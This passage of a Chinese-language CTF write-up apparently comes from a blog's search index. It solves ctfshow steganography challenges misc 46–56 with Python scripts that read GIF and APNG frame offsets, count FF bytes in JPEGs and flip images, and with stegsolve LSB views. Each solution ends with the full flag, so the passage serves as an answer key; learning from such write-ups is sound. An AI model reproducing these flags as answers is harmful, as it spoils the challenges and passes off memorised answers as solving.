文件并提取偏移量</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_offsets</span>(<span class="params">gif_file</span>):</span><br><span class="line">    point_list = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(gif_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        bin_data = f.read()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(bin_data)):</span><br><span class="line">            <span class="keyword">if</span> i + <span class="number">1</span> &lt; <span class="built_in">len</span>(bin_data) <span class="keyword">and</span> bin_data[i] == <span class="number">0x21</span> <span class="keyword">and</span> bin_data[i + <span class="number">1</span>] == <span class="number">0xF9</span>:</span><br><span class="line">                l = struct.unpack(<span class="string">&#x27;&lt;H&#x27;</span>, bin_data[i + <span class="number">9</span>:i + <span class="number">11</span>])[<span class="number">0</span>]</span><br><span class="line">                r = struct.unpack(<span class="string">&#x27;&lt;H&#x27;</span>, bin_data[i + <span class="number">11</span>:i + <span class="number">13</span>])[<span class="number">0</span>]</span><br><span class="line">                point_list.append((l, r))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> point_list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据偏移量绘制黑色像素点</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw_image_from_offsets</span>(<span class="params">offsets, image_size=(<span class="params"><span class="number">400</span>, <span class="number">70</span></span>)</span>):</span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, image_size, (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> offsets:</span><br><span class="line">        img.putpixel(i, (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    img.save(<span class="string">&#x27;flag46.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gif_file = <span class="string">&#x27;misc46.gif&#x27;</span></span><br><span class="line">offsets = extract_offsets(gif_file)</span><br><span class="line">draw_image_from_offsets(offsets)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20241022164103111.png" alt="image-20241022164103111"></p><p>flag为ctfshow{05906b3be8742a13a93898186bc5802f}</p><h2 id="misc-47"><a href="#misc-47" class="headerlink" title="misc 47"></a>misc 47</h2><blockquote><p>没见过扶乩，那你知道笔仙吗</p></blockquote><p>又是apng，在每一个IDAT块前面都会有一个fcTL块，从中可以获取水平垂直偏移量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;misc47.png&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    c = f.read()</span><br><span class="line"></span><br><span class="line">c = c[c.index(<span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;6663544C00000001&#x27;</span>)):]</span><br><span class="line">pp = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1124</span>, <span class="number">2</span>):</span><br><span class="line">    start = c.index(<span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;6663544C0000&#x27;</span>) + struct.pack(<span class="string">&#x27;&gt;h&#x27;</span>, i))</span><br><span class="line">    fc = c[start:start + <span class="number">30</span>]</span><br><span class="line">    </span><br><span class="line">    x_offset = struct.unpack(<span class="string">&#x27;&gt;h&#x27;</span>, fc[<span class="number">18</span>:<span class="number">20</span>])[<span class="number">0</span>]</span><br><span class="line">    y_offset = struct.unpack(<span class="string">&#x27;&gt;h&#x27;</span>, fc[<span class="number">22</span>:<span class="number">24</span>])[<span class="number">0</span>]</span><br><span class="line">    pp.append((x_offset, y_offset))</span><br><span class="line"></span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="number">400</span>, <span class="number">70</span>), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pp:</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt;= i[<span class="number">0</span>] &lt; img.width <span class="keyword">and</span> <span class="number">0</span> &lt;= i[<span class="number">1</span>] &lt; img.height:</span><br><span class="line">        img.putpixel(i, (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">img.save(<span class="string">&#x27;flag.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>flag：ctfshow{6d51f85b45a0061754a2776a32cf26c4}</p><h2 id="misc-48"><a href="#misc-48" class="headerlink" title="misc 48"></a>misc 48</h2><blockquote><p>附件的第（Di）七（Qi）题（Ti）中有提示。本题略脑洞，可跳过</p></blockquote><p>用010打开看到提示，count FF &amp; minus 1 ctfshow{32}，翻译一下，应该是统计FF的数量，然后减一，flag ctfshow{中间有32个字符}</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20241022164052068.png" alt="image-20241022164052068"></p><p>上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;misc48.jpg&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line">ff_count_list = []</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">str_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">if</span> byte == <span class="number">0xFF</span>:</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> count &gt; <span class="number">0</span>:</span><br><span class="line">            str_num += <span class="number">1</span></span><br><span class="line">            ff_count_list.append(count-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> str_num &gt;= <span class="number">32</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">hex_string = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(num)[<span class="number">2</span>:] <span class="keyword">for</span> num <span class="keyword">in</span> ff_count_list])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ff_count_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;ctfshow&#123;&#123;<span class="subst">&#123;hex_string&#125;</span>&#125;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>flag：ctfshow{0cb07add909d0d60a92101a8b5c7223a}</p><h2 id="misc-49"><a href="#misc-49" class="headerlink" title="misc 49"></a>misc 49</h2><blockquote><p>它们一来就是十六种。本题略脑洞，可跳过</p></blockquote><p>010打开看到有N多字符串，不正常，但对不上脑电波，查看其他大佬的wp发现是，提取出FFE？中的？位置的字符，拼接起来就是flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./misc49/misc49.jpg&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    bin_data = f.read()</span><br><span class="line">    </span><br><span class="line">hex_data = bin_data.<span class="built_in">hex</span>().upper()</span><br><span class="line">l = hex_data.split(<span class="string">&quot;FFE&quot;</span>)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(l)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(l[i]) &gt; <span class="number">0</span>:</span><br><span class="line">        flag += l[i][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;ctfshow&#123;&#123;<span class="subst">&#123;flag.lower()[:<span class="number">32</span>]&#125;</span>&#125;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>flag：ctfshow{0c618671a153f5da3948fdb2a2238e44}</p><h2 id="misc-50"><a href="#misc-50" class="headerlink" title="misc 50"></a>misc 50</h2><blockquote><p>有时候视线也要放低一点<br><del>出题人说出完这题他就要跑路去玩MHR了，51题明年见</del></p></blockquote><p>直接上stegsolve</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20241022164039158.png" alt="image-20241022164039158"></p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20241022164034839.png" alt="image-20241022164034839"></p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20241022164030313.png" alt="image-20241022164030313"></p><p>flag：ctfshow{84470883ee1eec2e886436461bf79111}</p><h2 id="misc-53"><a href="#misc-53" class="headerlink" title="misc 53"></a>misc 53</h2><blockquote><p>开始愉快的LSB部分。</p></blockquote><p>stegsolve直接出</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20241022164024321.png" alt="image-20241022164024321"></p><p>flag：ctfshow{69830d5a3a3b5006f7b11193e9bc22a2}</p><h2 id="misc-54"><a href="#misc-54" class="headerlink" title="misc 54"></a>misc 54</h2><blockquote><p>还是愉快的LSB部分。</p></blockquote><p>stegsolve直接出</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20241022164017151.png" alt="image-20241022164017151"></p><p>flag：ctfshow{b1f8ab24b8ca223d0affbf372ba0e4fa}</p><h2 id="misc-55"><a href="#misc-55" class="headerlink" title="misc 55"></a>misc 55</h2><blockquote><p>怎么又是愉快的LSB部分。</p></blockquote><p>发现图片是倒着的，逆转一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;input.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flipped_img_vertical = img.transpose(Image.FLIP_TOP_BOTTOM)</span><br><span class="line">flipped_img_vertical.save(<span class="string">&#x27;flipped_vertical.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后用stegsolve打开，发现zip文件头，保存，解压，拿到flag</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20241022163959846.png" alt="image-20241022163959846"></p><p>flag：ctfshow{daf256838e19a19d9e7b0a69642ad5ee}</p><h2 id="misc-56"><a href="#misc-56" class="headerlink" title="misc 56"></a>misc 56</h2><blockquote><p>怎么老是愉快的LSB部分。</p></blockquote><p>直接上stegsolve</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20241022163935941.png" alt="image-20241022163935941"></p><p>flag：ctfshow{1b30c28a5fca6cec5886b1d2cc8b1263}</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
